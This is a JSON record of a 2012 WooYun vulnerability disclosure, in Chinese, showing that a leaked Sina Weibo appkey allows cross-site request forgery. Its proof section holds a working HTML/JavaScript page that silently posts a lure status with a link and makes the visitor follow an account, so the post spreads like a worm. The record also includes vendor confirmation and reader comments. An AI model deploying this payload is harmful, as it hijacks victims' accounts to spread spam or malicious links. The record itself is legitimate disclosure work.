{"id": 20663, "wybug_id": "wooyun-2012-05068", "wybug_title": "新浪微博开放平台接口恶意利用漏洞可导致病毒传播", "wybug_corp": "新浪", "wybug_author": "songlv", "wybug_date": "2012-03-06 13:36", "wybug_open_date": "2012-04-20 13:37", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-04-20：\t细节向公众公开  简要描述： appkey泄漏 + 自动发微博 + 自动加关注 等 详细说明：  漏洞:1.有appkey即可调用接口:随便点一个土豆网的分享按钮即可看到土豆网的appkey:appkey=2043051649http://v.t.sina.com.cn/share/share.php?c=spr_web_bd_tudou_weibo&url=http%3A%2F%2Fwww.tudou.com%2Fprograms%2Fview%2FL5PVW-u0ewE%2F%3FresourceId%3D0_03_05_02&title=%E3%80%8A%E6%AF%81%E5%AE%B9%E5%B0%91%E5%A5%B3%E8%BF%9B%E4%BA%AC%E6%B2%BB%E7%96%97%E3%80%8B+%EF%BC%88%E5%8F%AF%E9%80%89%E5%8E%9F%E7%94%BB%E6%B8%85%E6%99%B0%E5%BA%A6%EF%BC%89&source=%E5%9C%9F%E8%B1%86%E7%BD%91&sourceUrl=http%3A%2F%2Fwww.tudou.com%2F&content=gb2312&pic=http%3A%2F%2Fi2.tdimg.com%2F122%2F452%2F239%2Fp.jpg&appkey=2043051649&ralateUid=16921138702.利用此appkey,制作一个第三方页面,调用微博接口自动跨域提交信息,见代码3.将第三方页面URL,分享至微博,网友即可病毒传播请用测试帐号访问,演示地址:http://weibo.com/1829851507/y8DfIdTWT   漏洞证明：  \n<html><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><!-- 自动加关注 --><form action=\"http://api.t.sina.com.cn/friendships/create.xml?source=2043051649\" method=\"post\" id=\"f\" target=\"ifr\"><input name=\"user_id\" id=\"fuid\"></form><iframe id=\"ifr\" name=\"ifr\"></iframe><!-- 自动发微博 --><form action=\"http://api.t.sina.com.cn/statuses/update.xml?source=2043051649\" method=\"post\"  id=\"f2\" target=\"ifr2\"><input name=\"status\" id=\"updatemsg\" value=\"\"><input name=\"type\" value=\"discuss\"><input  type=\"submit\"></form><iframe id=\"ifr2\" name=\"ifr2\"></iframe><script>function update(msg){\tdocument.getElementById('updatemsg').value=msg;\tdocument.getElementById('f2').submit();}function follow(uid){\tdocument.getElementById('fuid').value=uid;\tdocument.getElementById('f').submit();}update('白静被杀，盘点因情变酿成悲剧的明星们  http://x.com/?id=' + new Date().getTime());//加关注follow(\"1649172451\");//自动发微博</script></html>\n   修复方案：  不是禁止cookie方式访问了么,咋还能呢   版权声明：转载请注明来源 songlv@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-03-06 14:59 厂商回复： 感谢提供 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-03-06 13:49 |    \t\tsonglv \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:8        | 只为安全)\t\t \n  1.0 和 2.0接口均存在此问题https://api.weibo.com/2/statuses/update.json    \n     2012-03-06 13:54 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  洞主真是hellosamy附体啊！    \n     2012-03-06 14:01 |    \t\tsonglv \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:8        | 只为安全)\t\t \n  @shine 为了多赚点 rank嘛,CSRF漏洞最容易找了,也是最容易被忽视的,呵呵    \n     2012-03-06 16:19 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  因为api.weibo.com和weibo.com同域，所以可以进行CSRF...这个逻辑猜对了么？    \n     2012-03-06 16:30 |    \t\t凤凰 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 涅磐)\t\t \n  @horseluke 同问。    \n     2012-03-06 17:00 |    \t\tWebSPRing \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:18        | Focus on Web Security (wspringox@gmail.c...)\t\t \n  @horseluke 这里的CSRF与api.weibo.com和weibo.com是否同域应该没关系，因为这里是利用泄露的API Key来调用API接口向api.weibo.com发起的    \n     2012-04-20 13:51 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @WebSPRing appkey一般都是属于公开内容的。从披露结果来看，貌似逻辑是猜对了。    \n     2012-04-30 22:18 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  缺陷关联： WooYun: 新浪微博可能导致用户信息泄露的BUG （api与应用体系隔离不严格）    \n     2012-04-30 22:19 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  缺陷关联： WooYun: 百度空间潜在的CSRF蠕虫威胁 （应用体系之间隔离不严格）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}